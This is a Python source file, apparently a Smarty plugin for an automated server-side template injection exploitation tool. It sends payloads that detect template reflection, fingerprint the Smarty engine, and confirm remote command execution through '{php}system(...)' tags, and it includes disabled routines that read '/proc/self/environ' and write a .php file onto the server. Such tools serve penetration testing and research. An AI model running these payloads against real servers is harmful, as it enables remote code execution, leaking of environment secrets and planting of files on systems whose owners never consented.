from core.check import Check
from utils.loggers import log
import random
import string
import requests
import urlparse
import os

class Smarty(Check):
    
    def init(self):
        
        # Declare payload
        self.payload_left = '{%s}' % self.rand_left
        self.payload_right = '{%s}' % self.rand_right
        
        self._check_reflection()
        
        if not self.get('reflection'):
            return
            
        log.warn('Reflection detected')
        
        self._check_engine()
            
        if not self.get('language') or  not self.get('engine'):
            return
            
        log.warn('Smarty engine detected')   
        
        self._check_os()
        
        if self.get('exec'):
            log.warn(
                'Shell command execution detected on \'%s\' operating system' % (
                    self.get('os', 'undetected')
                )
            )
        
        # I've tested the techniques described in this article
        # http://blog.portswigger.net/2015/08/server-side-template-injection.html
        # for Smarty version prior 3.1.24 (3.1.23 and 3.1.21) but do not work for me.
        # 
        # Example on 3.1.21 when trying reading file with using self::getStreamVariable():
        # Cannot access self:: when no class scope is active in smarty-3.1.21/libs/sysplugins/smarty_internal_templatebase.php(157) : eval()'d code on line 23
        
        #self._check_read()
        #if self.get('read'):
        #    log.warn('Can ready arbitrary file')
        #self._check_write()
            
    def _check_engine(self):
        
        randA = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        randB = ''.join(random.choice(string.letters + string.digits) for _ in range(2))
        
        payload = '%s{*comment*}%s' % (randA, randB)
        expected = randA + randB
                
        if expected == self.req(payload):
            self.set('language', 'php')
            self.set('engine', 'smarty-*')
    
    def _check_reflection(self):
        
        randA = random.randint(10, 100)
        randB = random.randint(10, 100)

        payload = '{%i*%i}' % (randA, randB)
        expected = str(randA*randB)
        
        if expected == self.req(payload):
            self.set('reflection', True)
        
    def _check_os(self):
        
        expected_rand = str(random.randint(999, 10000))
        payload = """{php}system('echo %s');{/php}""" % expected_rand
        
        result_php_tag = self.req(payload) 
        
        # If {php} is sent back means is in secure mode
        if '{php}' in result_php_tag:
            self.set('engine', 'smarty-secured')
        elif expected_rand == result_php_tag:
            self.set('engine', 'smarty-unsecured')
            self.set('exec', True)
    
            payload = """{php}echo PHP_OS;{/php}"""
            self.set('os', self.req(payload))
    
    def _check_read(self):
        
        payload = """{self::getStreamVariable("file:///proc/self/environ")}"""
        result_proc_self_environ = self.req(payload)
        
        if 'PATH=' in result_proc_self_environ:
            self.set('read', True)
            
    def _check_write(self):
        
        return
        
        rand_filename = ''.join(random.choice(string.letters) for _ in range(5)) + '.php'

        payload = """{Smarty_Internal_Write_File::writeFile("%s","1",self::clearConfig())}""" % rand_filename
        url_path = urlparse.urlparse(self.channel.url).path
        url_folder, url_file = os.path.split(url_path)
        
        url = self.channel.url.replace(url_file, rand_filename)
        
        print requests.get(url) == '1', url, requests.get(url)
        
        if requests.get(url) == '1':
            self.set('write', True)
        
        
